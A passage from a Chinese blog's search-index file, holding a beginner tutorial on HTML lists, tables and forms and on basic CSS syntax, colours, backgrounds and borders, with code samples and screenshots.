class="tag">&lt;/<span class="name">ol</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>进一步升级：</p><figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ol</span> <span class="attr">type</span>=<span class="string">"..."</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>...<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ol</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>相同地，type里面写属性：</p><table><thead><tr><th style="text-align:center"><strong>值</strong></th><th style="text-align:center"><strong>样式</strong></th></tr></thead><tbody><tr><td style="text-align:center"><strong>1</strong></td><td style="text-align:center"><strong>1、2、3</strong></td></tr><tr><td style="text-align:center"><strong>i</strong></td><td style="text-align:center"><strong>i、ii、iii</strong></td></tr><tr><td style="text-align:center"><strong>I</strong></td><td style="text-align:center"><strong>I、II、III</strong></td></tr><tr><td style="text-align:center"><strong>a</strong></td><td style="text-align:center"><strong>a、b、c</strong></td></tr><tr><td style="text-align:center"><strong>A</strong></td><td style="text-align:center"><strong>A、B、C</strong></td></tr></tbody></table><h4 id="定义列表"><a class="markdownIt-Anchor" href="#定义列表"></a> 定义列表</h4><p>●  &lt; dl &gt; ：定义列表</p><p>●  &lt; dt &gt;：定义专业术语或名词</p><p>●  &lt; dd &gt;：对名词进行解释和描述</p><p>代码：</p><figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dl</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dt</span>&gt;</span>...<span class="tag">&lt;/<span class="name">dt</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dd</span>&gt;</span>...<span class="tag">&lt;/<span class="name">dd</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dl</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><h4 id="嵌套列表"><a class="markdownIt-Anchor" href="#嵌套列表"></a> 嵌套列表</h4><p>先来总结下前面说的3中列表：</p><p><strong>1、无序列表 —&gt; ul  li  符合嵌套的规范</strong></p><p><strong>2、有序列表 —&gt; ol  li  一般用的比较少，可以用无序列表来实现</strong></p><p><strong>3、定义列表 —&gt; dl  dt  dd  列表项需要添加标题和对标题进行描述的内容</strong></p><blockquote><p>注 ：列表之间可以相互嵌套，形成多层级的列表。</p></blockquote><h3 id="标签"><a class="markdownIt-Anchor" href="#标签"></a> 标签</h3><h4 id="表格标签"><a class="markdownIt-Anchor" href="#表格标签"></a> 表格标签</h4><p>●  &lt; table &gt;：表格的最外层容器</p><p>●  &lt; tr &gt;：定义表格行</p><p>●  &lt; th &gt;：定义表头</p><p>●  &lt; td &gt;：定义表格单元</p><p>●  &lt; caption &gt;：定义表格标题</p><figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">table</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">caption</span>&gt;</span>...<span class="tag">&lt;/<span class="name">caption</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">th</span>&gt;</span>...<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span>...<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>▲语义化标签：</p><p>&lt; thead &gt;、&lt; tbody &gt;、&lt; tfoot &gt;</p><p>▲ 用法：</p><figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">table</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">thead</span>&gt;</span></span><br><span class="line">    ...</span><br><span class="line"><span class="tag">&lt;/<span class="name">thead</span>&gt;</span></span><br><span class="line">  </span><br><span class="line"><span class="tag">&lt;<span class="name">tbody</span>&gt;</span></span><br><span class="line">    ...</span><br><span class="line"><span class="tag">&lt;/<span class="name">tbody</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">tfoot</span>&gt;</span></span><br><span class="line">    ...</span><br><span class="line"><span class="tag">&lt;/<span class="name">tfoot</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><blockquote><p>注：tbody可以出现多次，但是thead、tfoot只能出现一次</p></blockquote><h4 id="表格属性"><a class="markdownIt-Anchor" href="#表格属性"></a> 表格属性</h4><table><thead><tr><th style="text-align:center"><strong>代码</strong></th><th style="text-align:center"><strong>属性</strong></th></tr></thead><tbody><tr><td style="text-align:center"><strong>border</strong></td><td style="text-align:center"><strong>表格边框</strong></td></tr><tr><td style="text-align:center"><strong>cellpadding</strong></td><td style="text-align:center"><strong>单元格内的空间</strong></td></tr><tr><td style="text-align:center"><strong>cellspacing</strong></td><td style="text-align:center"><strong>单元格之间的空间</strong></td></tr><tr><td style="text-align:center"><strong>rowspan</strong></td><td style="text-align:center"><strong>合并行</strong></td></tr><tr><td style="text-align:center"><strong>colspan</strong></td><td style="text-align:center"><strong>合并列</strong></td></tr><tr><td style="text-align:center"><strong>align</strong></td><td style="text-align:center"><strong>左右对齐方式</strong></td></tr><tr><td style="text-align:center"><strong>valign</strong></td><td style="text-align:center"><strong>上下对齐方式</strong></td></tr></tbody></table><blockquote><p>注：1、<strong>border、cellpadding、cellspacing</strong>一般写在<strong>table</strong>标签里面，后面加上数值</p><p>2、<strong>rowspan、colspan</strong>一般写在<strong>th</strong>标签里面，并且当<strong>th</strong>标签和<strong>td</strong>标签数量不相同时常用</p><p>3、<strong>align、valign</strong>一般写在<strong>tr</strong>标签里面（<strong>align</strong>属性有：<strong>left、right、center、bottom</strong>… ; <strong>valign</strong>属性有<strong>top、bottom、center</strong>…）</p></blockquote><h4 id="表单input标签"><a class="markdownIt-Anchor" href="#表单input标签"></a> 表单input标签</h4><p>●  &lt; form &gt;：表单的最外层容器</p><p>●  &lt; input &gt;：标签用于搜集用户信息，根据不同的type属性值，展示不同的控件（输入框、密码框…）</p><table><thead><tr><th style="text-align:center"><strong>type属性</strong></th><th style="text-align:center"><strong>含义</strong></th></tr></thead><tbody><tr><td style="text-align:center"><strong>text</strong></td><td style="text-align:center"><strong>普通的文本输入框</strong></td></tr><tr><td style="text-align:center"><strong>password</strong></td><td style="text-align:center"><strong>密码输入框</strong></td></tr><tr><td style="text-align:center"><strong>checkbox</strong></td><td style="text-align:center"><strong>复选框</strong></td></tr><tr><td style="text-align:center"><strong>radio</strong></td><td style="text-align:center"><strong>单选框</strong></td></tr><tr><td style="text-align:center"><strong>file</strong></td><td style="text-align:center"><strong>上传文件</strong></td></tr><tr><td style="text-align:center"><strong>submit</strong></td><td style="text-align:center"><strong>提交按钮</strong></td></tr><tr><td style="text-align:center"><strong>reset</strong></td><td style="text-align:center"><strong>重置按钮</strong></td></tr></tbody></table><p>代码：</p><figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>文本输入框：<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span>/&gt;</span></span><br><span class="line">        </span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>密码框：<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"password"</span> /&gt;</span></span><br><span class="line">        </span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>复选框：<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"checkbox"</span>/&gt;</span>A</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"checkbox"</span>/&gt;</span>B</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"checkbox"</span>/&gt;</span>C</span><br><span class="line">        </span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>单选框：<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"radio"</span> <span class="attr">name</span>=<span class="string">"***"</span>/&gt;</span>a</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"radio"</span> <span class="attr">name</span>=<span class="string">"***"</span>/&gt;</span>b</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"radio"</span> <span class="attr">name</span>=<span class="string">"***"</span>/&gt;</span>c</span><br><span class="line">        <span class="comment">&lt;!--name里面内容相同--&gt;</span></span><br><span class="line">        </span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>上传文件<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> /&gt;</span></span><br><span class="line">        </span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>提交<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> /&gt;</span></span><br><span class="line">        </span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>重置<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"reset"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>看下效果：</p><p><img src="https://cdn.jsdelivr.net/gh/whloki/cdn@1.2/images/html_2.jpg" alt="表单标签"></p><p>升级版：</p><figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://..."</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>文本输入框：<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">placeholder</span>=<span class="string">"请输入用户名"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>密码框：<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"password"</span> <span class="attr">placeholder</span>=<span class="string">"请输入密码"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>复选框：<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"checkbox"</span> <span class="attr">checked</span>&gt;</span>A</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"checkbox"</span> <span class="attr">disabled</span>/&gt;</span>B</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"checkbox"</span>/&gt;</span>C</span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><blockquote><p>1、form标签里面的action：当点击提交后，后台会把你的信息提交并跳转到该网址</p><p>2、input标签里面的placeholder：placeholder后面所写内容会出现在文本/密码框里</p><p>3、input标签里面的checked：该选项默认被选中，disabled是：该选项不能被选中</p></blockquote><p>来看看效果：</p><p><img src="https://cdn.jsdelivr.net/gh/whloki/cdn@1.2/images/html_3.jpg" alt="表单标签"></p><p>表单相关标签</p><p>●  &lt; textarea &gt;：多行文本框</p><p>●  &lt; select &gt;、&lt; option &gt;：下拉菜单</p><p>●  &lt; label &gt;：辅助表单</p><p>代码：</p><figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://..."</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>多行文本框<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">textarea</span> <span class="attr">cols</span>=<span class="string">"30"</span> <span class="attr">rows</span>=<span class="string">"15"</span>&gt;</span> <span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>下拉菜单<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">select</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">option</span> <span class="attr">selected</span>&gt;</span>请选择<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">option</span>&gt;</span>济南<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">option</span>&gt;</span>青岛<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">option</span>&gt;</span>枣庄<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">option</span>&gt;</span>烟台<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">select</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">option</span> <span class="attr">selected</span>&gt;</span>请选择<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">option</span>&gt;</span>济南<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">option</span>&gt;</span>青岛<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">option</span>&gt;</span>枣庄<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">option</span>&gt;</span>烟台<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">multiple</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">option</span> <span class="attr">selected</span>&gt;</span>请选择<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">option</span>&gt;</span>济南<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">option</span>&gt;</span>青岛<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">option</span>&gt;</span>枣庄<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">option</span>&gt;</span>烟台<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"radio"</span> <span class="attr">name</span>=<span class="string">"***"</span> <span class="attr">id</span>=<span class="string">"man"</span>/&gt;</span><span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"man"</span>&gt;</span>男<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"radio"</span> <span class="attr">name</span>=<span class="string">"***"</span> <span class="attr">id</span>=<span class="string">"woman"</span>/&gt;</span><span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"woman"</span>&gt;</span>女<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><blockquote><p>倒数3、4行里面的id和for里面内容一致，这样会实现：点击名称也会选中选选项</p></blockquote><p>看下效果：</p><p><img src="https://cdn.jsdelivr.net/gh/whloki/cdn@1.2/images/html_4.jpg" alt="表单标签"></p><h4 id="divspan标签"><a class="markdownIt-Anchor" href="#divspan标签"></a> div+span标签</h4><p>●  div（块）：&lt; div &gt;标签用来划分一个区域，相当于一块区域容器，可以容纳段落、标题、表格、图像等各种网</p><p>页元素；HTML中大多数的标签都可以嵌套在&lt; div &gt;标签中，&lt; div &gt;中还可以嵌套多层&lt; div &gt;，用来将网页分割成</p><p>独立的、不同的部分，来实现网页的规划和布局。</p><p>●  span（内联）：&lt; span &gt;标签用来修饰文字的，div与span都是没有任何默认样式的，需要配合CSS来使用。</p><blockquote><p>这里先不写这两种标签用法，先学习学习CSS</p></blockquote><h1 id="css"><a class="markdownIt-Anchor" href="#css"></a> CSS</h1><h2 id="基础语法"><a class="markdownIt-Anchor" href="#基础语法"></a> 基础语法</h2><blockquote><p>选择器{属性1： 值1；属性2：值2…}</p><p>width：宽</p><p>height：高</p><p>background-color：背景颜色</p><p>单位：px —&gt; 像素  % —&gt; 百分比</p></blockquote><p>用法：在***&lt; head &gt;&lt; /head &gt;***里面写一下内容：</p><figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line">div{</span><br><span class="line">width: 100px;</span><br><span class="line">height: 100px;</span><br><span class="line">background-color: aqua;</span><br><span class="line">}</span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><h2 id="start-2"><a class="markdownIt-Anchor" href="#start-2"></a> Start</h2><h3 id="内联样式与内部样式"><a class="markdownIt-Anchor" href="#内联样式与内部样式"></a> 内联样式与内部样式</h3><blockquote><p>内联样式：style属性</p><p>内部样式：style标签</p></blockquote><h4 id="内联样式"><a class="markdownIt-Anchor" href="#内联样式"></a> 内联样式：</h4><figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"width: 200px;height: 100px;background-color: aquamarine;"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><h4 id="内部样式"><a class="markdownIt-Anchor" href="#内部样式"></a> 内部样式：</h4><figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="css"><span class="selector-tag">div</span>{<span class="attribute">width</span>: <span class="number">200px</span>;<span class="attribute">height</span>: <span class="number">100px</span>;<span class="attribute">background-color</span>: aquamarine}</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><h4 id="区别"><a class="markdownIt-Anchor" href="#区别"></a> 区别：</h4><blockquote><p>1、内联样式在HTML标签上添加style属性</p><p>2、内部样式在&lt; style &gt;标签内添加样式</p><p>3、内部样式优点：代码可以复用，可以使结构和样式分开处理；</p></blockquote><h3 id="外部样式"><a class="markdownIt-Anchor" href="#外部样式"></a> 外部样式</h3><blockquote><p>引入一个单独的CSS文件！!</p></blockquote><p><em><strong>&lt; link &gt;标签：引入外部资源(写在head标签内部)</strong></em></p><p><em><strong>rel属性：指定资源跟页面的关系</strong></em></p><p><em><strong>href属性：资源的地址</strong></em></p><p>基本格式：</p><figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"./style.css"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><h3 id="css颜色表示"><a class="markdownIt-Anchor" href="#css颜色表示"></a> CSS颜色表示</h3><h4 id="1-单词表示法"><a class="markdownIt-Anchor" href="#1-单词表示法"></a> 1、单词表示法</h4><p>用英文单词直接表示（看你单词水平厉不厉害）</p><h4 id="2-16进制表示法"><a class="markdownIt-Anchor" href="#2-16进制表示法"></a> 2、16进制表示法</h4><p>表示方法：‘#’ + 6位16进制数</p><p>取值范围：#000000 – #ffffff</p><h4 id="3-rgb三原色表示法红绿蓝"><a class="markdownIt-Anchor" href="#3-rgb三原色表示法红绿蓝"></a> 3、RGB三原色表示法(红绿蓝)</h4><p>表示方法：rgb(x,y,z)</p><p>x,y,z取值范围：0~255</p><h3 id="css背景样式"><a class="markdownIt-Anchor" href="#css背景样式"></a> CSS背景样式</h3><blockquote><p>background-color：背景颜色</p><p>background-image：背景图</p><p>background-repeat：背景图片的平铺方</p><p>background-position：背景图片的位置</p><p>background-attachment：背景图随滚动条的移动方式</p></blockquote><p>1、background-color：背景颜色</p><p>2、background-image：背景图片</p><p>​● url（背景地址）</p><p>​● 默认：水平垂直铺满背景图</p><p>3、background-repeat：背景图片的平铺方式</p><p>​● repeat-x：x轴平铺</p><p>​● repeat-y：y轴平铺</p><p>​● repeat：x，y都平铺（默认值）</p><p>​● no-repeat：x，y都不平铺</p><p>4、background-position：背景图片的位置</p><p>格式：x     y</p><p>​● x和y可以是数字（单位px），可以用百分数</p><p>​● x和y可以是英文单词，left、center、right、top、bottom…随意搭配</p><p>5、background-attachment：背景图随滚动条的移动方式   常用值：</p><p>​● scroll：默认值：背景元素按照当前元素进行偏移</p><p>​● fixed：背景位置是按照浏览器进行偏移</p><p>简单使用：</p><figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line">div{</span><br><span class="line">width: 600px;height: 600px;   </span><br><span class="line">background-color: aqua;</span><br><span class="line">background-image: url(../img/picture.jpg); </span><br><span class="line">background-repeat: no-repeat;</span><br><span class="line">background-position: left center;</span><br><span class="line">background-attachment: scroll;</span><br><span class="line">}</span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><h3 id="css-边框样式"><a class="markdownIt-Anchor" href="#css-边框样式"></a> CSS 边框样式</h3><blockquote><p>border-style：边框的样式</p><p>border-width：边框的大小</p><p>border-color：边框的颜色</p></blockquote><p>1、border-style：</p><p>●  soli：实线</p><p>●  dashed：虚线</p><p>●  dotted：点线</p><p>2、border-width：</p><p>●  px…</p><p>3、border-color：</p><p>●  red  #0000…</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HTML </tag>
            
            <tag> CSS </tag>
            
            <tag> 前端 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Algorithm——简单算法总结</title>
      <link href="/posts/algorithm/"/>
      <url>/posts/algorithm/</url>
      
